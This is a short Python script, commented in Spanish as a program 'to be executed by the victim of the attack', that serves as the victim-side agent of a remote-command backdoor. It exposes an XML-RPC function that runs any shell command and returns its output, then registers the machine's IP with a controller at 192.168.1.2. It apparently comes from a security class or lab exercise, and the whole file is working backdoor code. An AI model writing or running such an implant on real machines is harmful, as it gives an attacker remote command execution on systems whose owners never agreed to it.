'''
Este programa debe ser ejecutado por la víctima del ataque
'''
from xmlrpc.server import SimpleXMLRPCServer
import xmlrpc.client
import subprocess
import socket

def lanzar_comando(comando):
    result = subprocess.run(comando,capture_output=True,shell=True)
    return result.stdout

server = SimpleXMLRPCServer(('localhost', 9000))
server.register_function(lanzar_comando, 'command')

host=socket.gethostbyname(socket.gethostname())
client = xmlrpc.client.ServerProxy('http://192.168.1.2:9000')
result=getattr(client, 'registrar')(str(host))

try:
    print('Use Control-C to exit')
    server.serve_forever()
except KeyboardInterrupt:
    print('Exiting')
